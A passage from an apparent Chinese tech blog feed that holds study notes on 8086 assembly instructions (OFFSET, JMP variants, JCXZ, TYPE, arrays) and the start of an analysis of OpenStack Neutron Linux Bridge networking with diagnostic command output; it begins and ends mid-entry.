src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315150452.png"><br>首先开启程序之后CS和IP寄存器和原本的不一样，原因是因为之前的位置都存储了数据，通过d指令去查看原本位置的内容，我们的代码存储了字母，字母的存储方式为字母的ascii码的16进制，丢到里面，然后以知道bcdef，也就是076A:0030的位置，填充完后面还是跟随了很多0，然后紧接着是栈段的10个0，但是他这里存储的不仅仅是10个，除去ef，就是14+16个0，为什么会这样？因为每一个段不是通过偏移来设置位置的，而是通过CS，CS是必须被16整除的，也就是说如果细分到16以内的位置只能通过偏移来找，就是说基础单位就是16个，最终的数据如果是没撑满这16位，那么剩下的他都会不作为，并且依旧作为当前段的内容，包括上面定义的stack。所以实际数据段和栈段的范围是这样的<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315151141.png"><br>上面的红框是数据段，下面的红框是栈段。</p><h2 id="OFFSET指令"><a href="#OFFSET指令" class="headerlink" title="OFFSET指令"></a>OFFSET指令</h2><p>offset是只能在编写代码文件时使用的指令，他的作用是获取某个数据的位置，具体可以参考下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    a: db 10 dup(10H)</span><br><span class="line">    b: db 10 dup(11H)</span><br><span class="line">    ; start: mov ax,offset a[0]</span><br><span class="line">    ; mov bx,offset b[0]</span><br><span class="line">    start: mov ax,offset a</span><br><span class="line">           mov bx,offset b</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>直接查看内存中的内容，然后再去看要执行的内容，结果如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315191910.png"><br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315191929.png"><br>写入了10个<code>10</code>和<code>11</code>，在执行MOV的时候对应的值也是这俩数据的偏移位置，这就是offset的作用，用来查找对应数据的偏移值。</p><h2 id="JMP指令进阶"><a href="#JMP指令进阶" class="headerlink" title="JMP指令进阶"></a>JMP指令进阶</h2><p>jmp的作用是跳转，上面也实践了一下，他还有很多其他写法，这里列举一下</p><ul><li><code>jmp short</code> 近跳转，通过修改IP来跳转偏移，偏移量是一个有符号的 8 位数，范围为 -128 到 +127 字节。</li><li><code>jump far ptr</code> 远跳转，通过CS和IP来跳转，它可以实现很远的跳转。</li><li><code>jmp near ptr</code> 这个跳转是拿到数值的2个字节来跳转</li><li><code>jmp dword ptr</code> 这个跳转是拿到数值的4个字节来跳转</li></ul><p>具体举个他们的例子，汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    start: jmp short a</span><br><span class="line">    ; 如果这里不注释这256个db则是跳转不过去的,大家可以自己尝试</span><br><span class="line">    ; 跳转不过去的原因是因为近跳转范围只有`-128`~`127`字节</span><br><span class="line">    ; db 256 dup(0)</span><br><span class="line">    a: </span><br><span class="line">        mov ax,1H</span><br><span class="line">        jmp far ptr b</span><br><span class="line">        db 256 dup(0)</span><br><span class="line">    b: </span><br><span class="line">        mov ax,cs</span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov ax,offset c</span><br><span class="line">        mov ds:[0],ax</span><br><span class="line">        jmp word ptr ds:[0]</span><br><span class="line">    c:</span><br><span class="line">        mov ax,offset d</span><br><span class="line">        ; mov ds:[0],0000h</span><br><span class="line">        mov ds:[0],ax</span><br><span class="line">        mov ds:[2],cs</span><br><span class="line">        jmp dword ptr ds:[0]</span><br><span class="line">    d: </span><br><span class="line">        mov ax,0FFFFh</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>先看前3条执行过程，如下图，第一个jmp是采用一个偏移的方式，第二个jmp是采用一个地址段+偏移的方式<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315201358.png"><br>我们继续运行，查看第三个jmp，如下图，第三个jmp直接跳转DS的0000位置的地址<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315201416.png"><br>我们再去看一下这个DS:0000的内容，这个内容是什么那么他就会跳转到哪里，不出意外应该是在上图的倒数第三个位置，应该是0118，也就是C的偏移位置<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315201445.png"><br>因为有高低位平衡，所以这里是1801，实际就是0118，那这个偏移位置的内容是什么呢？我们继续用u指令看一下<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315201507.png"><br>很明显这里就是C函数的入口，并且D函数的入口也被C的第一条指令打进了DS:0000的位置，然后采用JMP去跳转，我们先看一下jmp之前的DS:0000的内容，是不是076A:0126，我们继续运行<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315201639.png"><br>发现是没问题的，因为存在高低位平衡，所以是26016A07实际就是076A0126，分别指向下一个CS和IP的正确位置，我们继续运行<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315201758.png"><br>程序成功退出结束。</p><h2 id="JCXZ指令"><a href="#JCXZ指令" class="headerlink" title="JCXZ指令"></a>JCXZ指令</h2><p>JCXZ是一条条件跳转指令，它的功能是检查CX寄存器是否为零，如果CX寄存器等于零，则跳转到指定的目标地址；如果CX寄存器不等于零，则继续执行下一条指令。具体参考代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    mov ax, 2       ; AX初始值为2</span><br><span class="line">    mov cx, 11      ; CX设为11，表示循环11次</span><br><span class="line">a:  </span><br><span class="line">    jcxz done       ; 如果CX为0，跳到done</span><br><span class="line">    add ax, ax      ; AX = AX + AX（AX乘以2）</span><br><span class="line">    dec cx          ; CX减1</span><br><span class="line">    jmp a           ; 无条件跳回a，继续循环</span><br><span class="line">done:               ; 循环结束</span><br><span class="line">    mov ah, 4Ch     ; 设置AH=4Ch，退出程序</span><br><span class="line">    int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>循环结束之后直接跳出了，这里需要一次性执行好多次t，可以自己修改代码，尝试个一两次知道怎么用就可以了。<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315203531.png"></p><h2 id="TYPE伪指令"><a href="#TYPE伪指令" class="headerlink" title="TYPE伪指令"></a>TYPE伪指令</h2><p>TYPE 可以用来查询某个变量的类型，返回其占用的字节数。简单举个例子，参考下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data</span><br><span class="line">data segment</span><br><span class="line">    var1 DB 10h         ; 定义一个字节变量</span><br><span class="line">    var2 DW 1234h       ; 定义一个字变量</span><br><span class="line">    var3 DD 0DEADBEEFh  ; 定义一个双字变量</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">    mov ax, TYPE var1   ; AX = 1（var1 是字节）</span><br><span class="line">    mov bx, TYPE var2   ; BX = 2（var2 是字）</span><br><span class="line">    mov cx, TYPE var3   ; CX = 4（var3 是双字）</span><br><span class="line">    int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="数组的读取和写入"><a href="#数组的读取和写入" class="headerlink" title="数组的读取和写入"></a>数组的读取和写入</h2><p>在代码段中读取和写入数组，直接上汇编代码，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line">data segment</span><br><span class="line">data ends</span><br><span class="line">stack segment</span><br><span class="line">    db 10 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">    arr db 12,34,56,78,9AH</span><br><span class="line">    start: </span><br><span class="line">           mov al,arr[2]</span><br><span class="line">           mov al,arr[4]</span><br><span class="line">           mov ax,word ptr arr[2]</span><br><span class="line">           mov si,offset arr</span><br><span class="line">           mov al,cs:[si+4] </span><br><span class="line">           mov al,cs:[si+6]</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>我们看一下每个mov执行实际给的内容，如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315211019.png"><br>上面是执行了4次，我们挨个看内容，第一个把al设置成了数组中的第二个数据也就是56，56的16进制刚好为38，然后他继续去拿第四个位置的内容是9A，咱们定义的时候也是直接的16进制的9A，所以这里也是没问题的，然后有执行了一个ax为第二个内容，但是这里为什么是4e38呢？<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315211949.png"><br>其实这里也是对的，通过d命令去查看这个位置的确就是这个内容。我们继续运行，查看内容<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315212153.png"><br>si拿到的数据是arr的0位偏移，也就是0000，这里拿到的内容也都是预期的。<br>上面的例子是基于代码段来去操作数据，下面来一个不同段的，原理都一样，主要是这里多了一个修改DS地址的指令，主要参考与下面汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line">data segment</span><br><span class="line">    arr db 10H,20H,30H,40H,50H</span><br><span class="line">    arr2 db &#x27;hello world&#x27;</span><br><span class="line">data ends</span><br><span class="line">stack segment</span><br><span class="line">    db 10 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">code segment</span><br><span class="line">    start: </span><br><span class="line">        mov ax,data</span><br><span class="line">        mov ds,ax</span><br><span class="line">        </span><br><span class="line">        mov al,arr[2]</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>我们执行以下看一下al的数据，如下图<br><img src="https://image.boychai.xyz/article/sync/Pasted%20image%2020250315213751.png"><br>还有一些额外写法都可以参考上面代码段中使用数组的汇编代码，这里DS修改之后就全都对的上了。然后如果数组不加<code>[]</code>那么他就是直接引用0的偏移位置。</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>上面均为自己学习整理的笔记，仅限参考，也欢迎大佬指出错误，非常感谢。</p>]]></content>
    
    
    <summary type="html">写在前面
没想到我有一天会去研究汇编，这是我从未设想的道路。😭

学习环境安装
项目地址： https://github.com/HaiPenglai/bilibili_assembly/
教学视频： https://www.bilibili.com/video/BV1eG4y1S7R5
安装配置具体可以参考视频，非常详细，本文不多介绍环境的安装与配置。

基础指令与寄存器
Debug命令
概述
Debug是DOS、Windows都提供的实模式(8086 方式)程序的调试工具。使用它，可以查看CPU各种寄存器中的内容，内存的情况和机器码级跟踪程序的运行。

功能
 * R命令 查看、改变CP</summary>
    
    
    
    <category term="开发相关" scheme="https://blog.boychai.xyz/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"/>
    
    <category term="asm" scheme="https://blog.boychai.xyz/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/asm/"/>
    
    
    <category term="asm" scheme="https://blog.boychai.xyz/tags/asm/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack-内部网络原理分析</title>
    <link href="https://blog.boychai.xyz/2025/02/15/OpenStack-%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://blog.boychai.xyz/2025/02/15/OpenStack-%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</id>
    <published>2025-02-15T15:05:00.000Z</published>
    <updated>2025-07-17T05:40:18.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于组件理解文章，这里单独做一个对于openstack网络组件<code>Neutron</code>的理解，本文只是我自己对于它的理解，因为网上的资料比较有限，本文只能代表我个人理解，有不对的地方欢迎大佬指正。我的环境是<code>Linux Bridge</code> + <code>VXLAN</code>的形式，具体的配置体现可以参考搭建文章的下面内容</p><blockquote><p>官方文档-1： <a href="https://docs.openstack.org/neutron/stein/install/controller-install-rdo.html">https://docs.openstack.org/neutron/stein/install/controller-install-rdo.html</a><br>官方文档-2： <a href="https://docs.openstack.org/neutron/stein/install/controller-install-option1-rdo.html">https://docs.openstack.org/neutron/stein/install/controller-install-option1-rdo.html</a><br>官方文档-3： <a href="https://docs.openstack.org/neutron/stein/install/controller-install-option2-rdo.html">https://docs.openstack.org/neutron/stein/install/controller-install-option2-rdo.html</a><br>linux bridge： <a href="https://blog.boychai.xyz/index.php/archives/83/">https://blog.boychai.xyz/index.php/archives/83/</a> (网站已被迁移，请在本站搜索 OpenStack-Stein版搭建-1控制1计算)<br>VXLAN： <a href="https://blog.boychai.xyz/index.php/archives/88/">https://blog.boychai.xyz/index.php/archives/88/</a> (网站已被迁移，请在本站搜索 OpenStack-网络-FLAT与VXLAN)</p></blockquote><h1 id="供应商-Provider网络"><a href="#供应商-Provider网络" class="headerlink" title="供应商-Provider网络"></a>供应商-Provider网络</h1><p>在没有创建<code>Self-service networks</code>网络的的时候，创建一个主机参考下面openstack网络拓扑<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250215141929.png"><br>网络相关的信息如下<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250215143526.png"><br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250215143547.png"><br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250215143955.png"><br>主机未开机的时候，在网络控制节点的网络情况是这样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# ip <span class="built_in">link</span></span><br><span class="line">......</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">8: tapa98eeb82-7a@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 0a:04:25:5a:e2:67 brd ff:ff:ff:ff:ff:ff link-netnsid 2</span><br><span class="line">9: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">[root@controller ~]# brctl show</span><br><span class="line">bridge name     bridge <span class="built_in">id</span>               STP enabled     interfaces</span><br><span class="line">brqdd604587-35          8000.000c2908b59e       no              ens33</span><br><span class="line">                                                        tapa98eeb82-7a</span><br><span class="line">[root@controller ~]# ip a</span><br><span class="line">......</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 fe80::ad6b:bdb0:9b14:c54d/64 scope <span class="built_in">link</span> noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">8: tapa98eeb82-7a@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 0a:04:25:5a:e2:67 brd ff:ff:ff:ff:ff:ff link-netnsid 2</span><br><span class="line">9: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.0.11/24 brd 10.0.0.255 scope global brqdd604587-35</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::d061:3cff:fedd:3f85/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@controller ~]# ip netns</span><br><span class="line">qdhcp-dd604587-3542-409b-9ca8-eed06840fb55 (<span class="built_in">id</span>: 2)</span><br><span class="line">[root@controller ~]# ip netns <span class="built_in">exec</span> qdhcp-dd604587-3542-409b-9ca8-eed06840fb55 ip a</span><br><span class="line">...</span><br><span class="line">2: ns-a98eeb82-7a@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fa:16:3e:53:6f:70 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 10.0.0.200/24 brd 10.0.0.255 scope global ns-a98eeb82-7a</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet 169.254.169.254/16 brd 169.254.255.255 scope global ns-a98eeb82-7a</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::f816:3eff:fe53:6f70/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>在对应实例的计算节点网络是这样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# ip <span class="built_in">link</span></span><br><span class="line">......</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">[root@compute1 ~]# brctl show</span><br><span class="line">bridge name     bridge <span class="built_in">id</span>               STP enabled     interfaces</span><br><span class="line">brqdd604587-35          8000.000c29a8d7e0       no              ens33</span><br><span class="line">[root@compute1 ~]# ip a</span><br><span class="line">......</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 fe80::ad6b:bdb0:9b14:c54d/64 scope <span class="built_in">link</span> tentative noprefixroute dadfailed</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5597:3a9:a4bd:ae3a/64 scope <span class="built_in">link</span> noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.0.31/24 brd 10.0.0.255 scope global brqdd604587-35</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>可以看到网络的id<code>dd604587-3542-409b-9ca8-eed06840fb55</code>会在网络控制节点和实例对应计算节点上创建一个网卡，并且取id的前10位作为网卡的名字，即<code>brqdd604587-35</code>，然后就是网络中的端口，可以参考上面网络端口的图片，上面有一个<code>network:dhcp</code>的端口，我感觉这个可以理解为在这个网络上的设备，这个dhcp的端口的名字为<code>a98eeb82-7abe</code>，可以对为网络控制节点中的<code>netns(网络命名空间)</code>，里面的一个设备<code>ns-a98eeb82-7a@if8</code>命名格式也是前10位，可以知道这个接口是当前网络中的DHCP服务，其中这个设备通过<code>link-netnsid</code>和<code>@if8</code>的标识可以判断出他是一个虚拟接口<code>(veth pair对)</code>，通过<code>@if8</code>可以看出他是从主机的<code>tapa98eeb82-7a</code>网卡接出来的，<code>tapa98eeb82-7a</code>是网桥<code>brqdd604587-35</code>中的接口。然后当前两台机器的网桥<code>brctl show</code>中可以看到<code>brqdd604587-35</code>都是<code>ens33</code>的网桥。当前它们的网络架构如下<br><img src="https://image.boychai.xyz/img/Pasted%20image%2020250215163534.png"><br>当实例开机，他们的网络情况会变会变成下面这样，网络控制节情况如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[root@controller ~]# ip <span class="built_in">link</span></span><br><span class="line">......</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">8: tapa98eeb82-7a@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 0a:04:25:5a:e2:67 brd ff:ff:ff:ff:ff:ff link-netnsid 2</span><br><span class="line">9: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">[root@controller ~]# brctl show</span><br><span class="line">bridge name     bridge <span class="built_in">id</span>               STP enabled     interfaces</span><br><span class="line">brqdd604587-35          8000.000c2908b59e       no              ens33</span><br><span class="line">                                                        tapa98eeb82-7a</span><br><span class="line">[root@controller ~]# ip a</span><br><span class="line">......</span><br><span class="line">8: tapa98eeb82-7a@if2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master brqdd604587-35 state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 0a:04:25:5a:e2:67 brd ff:ff:ff:ff:ff:ff link-netnsid 2</span><br><span class="line">9: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:08:b5:9e brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.0.11/24 brd 10.0.0.255 scope global brqdd604587-35</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::d061:3cff:fedd:3f85/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@controller ~]# ip netns</span><br><span class="line">qdhcp-dd604587-3542-409b-9ca8-eed06840fb55 (<span class="built_in">id</span>: 2)</span><br><span class="line">[root@controller ~]# ip netns <span class="built_in">exec</span> qdhcp-dd604587-3542-409b-9ca8-eed06840fb55 ip a</span><br><span class="line">......</span><br><span class="line">2: ns-a98eeb82-7a@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether fa:16:3e:53:6f:70 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 10.0.0.200/24 brd 10.0.0.255 scope global ns-a98eeb82-7a</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet 169.254.169.254/16 brd 169.254.255.255 scope global ns-a98eeb82-7a</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::f816:3eff:fe53:6f70/64 scope <span class="built_in">link</span></span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>在对应实例的计算节点中他的网络变成了这样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@compute1 ~]# ip <span class="built_in">link</span></span><br><span class="line">......</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast master brqdd604587-35 state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">6: brqdd604587-35: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:a8:d7:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">8: tap76c0c08c-79: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc 